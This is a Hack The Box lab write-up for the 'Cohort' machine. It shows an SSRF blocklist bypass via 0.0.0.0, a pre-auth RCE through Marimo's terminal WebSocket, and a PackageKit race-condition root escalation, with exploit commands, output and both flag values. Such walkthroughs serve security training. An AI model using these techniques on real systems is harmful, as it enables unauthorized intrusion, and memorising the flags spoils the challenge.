# HTB - Cohort
 
## 1. Reconnaissance
 
I started with an Nmap scan to identify open ports and running services.
 
```
nmap -sV cohort.htb
 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-15 16:22 +0200
Nmap scan report for cohort.htb (10.129.102.71)
Host is up (0.029s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain?
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.27 seconds
```
 
Only SSH and a web server (HTTP/HTTPS via nginx) are exposed. Port 53 shows up as `domain?` but doesn't seem directly relevant at this stage, so I focused on the web application first.
 
## 2. Enumeration
 
Browsing the website, I found a couple of names that could be useful later for wordlists, password guessing, or social engineering context:
 
- **Mara Quinteros** (Founder)
- **Devin Oyelaran** (Analytics Engineering)
While enumerating subdomains, I found `status.cohort.htb`, but it returned an unauthorized response.
 
I also noticed a feature on the site where you can submit a URL, and the application fetches it and displays a preview of the content — a classic pattern to test for **SSRF**.
 
Direct requests to loopback and internal addresses were blocked. However, I was able to bypass the filter using `http://0.0.0.0`, which is functionally equivalent to `127.0.0.1` but wasn't covered by the blocklist. This let me reach the internal `status` endpoint:
 
```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 15 Sep 2026 15:46:25 GMT
Content-Type: application/json
Content-Length: 548
Connection: keep-alive
 
{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}", "message": "Source reachable."}
```
 
This response leaks a hidden virtual host: `nb-1be3782a8afd3ad5.cohort.htb`.
 
After adding it to `/etc/hosts`, I visited the new host and found a **Marimo** login page (password/token field only). To identify the exact version running, I reused the SSRF to reach Marimo's internal version endpoint directly:
 
```
http://0.0.0.0:8888/api/version
```
 
```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 16 Sep 2026 10:09:40 GMT
Content-Type: application/json
Content-Length: 133
Connection: keep-alive
 
{"ok": true, "fetched_status": 200, "content_type": "text/plain; charset=utf-8", "preview": "0.20.4", "message": "Source reachable."}
```
 
This confirms Marimo **0.20.4**, which is vulnerable to a known pre-authentication RCE: **CVE-2026-39987**.
 
## 3. Foothold
 
Marimo exposes a WebSocket terminal endpoint (`/terminal/ws`) that, in this version, can be reached without authentication. Using a public exploit for CVE-2026-39987, I connected to it and got an interactive shell as the `marimo` user:
 
```
python3 exploit-marimo.py nb-1be3782a8afd3ad5.cohort.htb -i --any-ssl
[+] Connected to wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
[*] Interactive mode. type commands, Ctrl+C to exit
 
marimo@cohort:~$
```
 
## 4. User Flag
 
```
marimo@cohort:~$ cat user.txt
cat user.txt
824450568e3ab7c49e3ef20b9af42544
```
 
## 5. Privilege Escalation
 
With a foothold established, I ran **LinPEAS** to enumerate local privilege escalation vectors:
 
```
╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
PackageKit version detected: 1.2.8-2ubuntu1.2
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
```
 
The installed PackageKit version is vulnerable to **CVE-2026-41651 (Pack2TheRoot)**, a TOCTOU (time-of-check to time-of-use) local privilege escalation. I used a public exploit to abuse the race condition during package installation and obtain a root-owned SUID shell.
 
## 6. Root Flag
 
```
marimo@cohort:/tmp$ ./exploit
./exploit
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-56563.deb
[+] payload : /tmp/.pk-payload-56563.deb
[*] Transaction : /2_abbdbccd
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 104 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet
[*] t+3s: payload=exists dpkg_lock=free suid=not yet
 
[+] SUCCESS — SUID bash at t+2100ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
.suid_bash: no job control in this shell
.suid_bash-5.2# ls
ls
exploit
linpeas_host_checker_2175.err
linpeas_host_checker_2175.json
linpeas.sh
snap-private-tmp
systemd-private-2da0aad5039640a1a006a86f096bfe65-cohort-insights.service-F8GPij
systemd-private-2da0aad5039640a1a006a86f096bfe65-fwupd.service-mOtQTK
systemd-private-2da0aad5039640a1a006a86f096bfe65-man-db.service-fI8C2V
systemd-private-2da0aad5039640a1a006a86f096bfe65-ModemManager.service-bEMtmf
systemd-private-2da0aad5039640a1a006a86f096bfe65-polkit.service-MruIVc
systemd-private-2da0aad5039640a1a006a86f096bfe65-systemd-logind.service-ScCS0t
systemd-private-2da0aad5039640a1a006a86f096bfe65-systemd-resolved.service-KRdHNY
systemd-private-2da0aad5039640a1a006a86f096bfe65-systemd-timesyncd.service-3j4H7b
systemd-private-2da0aad5039640a1a006a86f096bfe65-upower.service-h5cOH7
tmux-1000
vmware-root_962-2990678749
.suid_bash-5.2# cd
cd
.suid_bash-5.2# ls
ls
notebooks  user.txt
.suid_bash-5.2# cd /root
cd /root
.suid_bash-5.2# ls
ls
root.txt
.suid_bash-5.2# cat root.txt
cat root.txt
b046291dccc4da3568378c57fafc5707
```
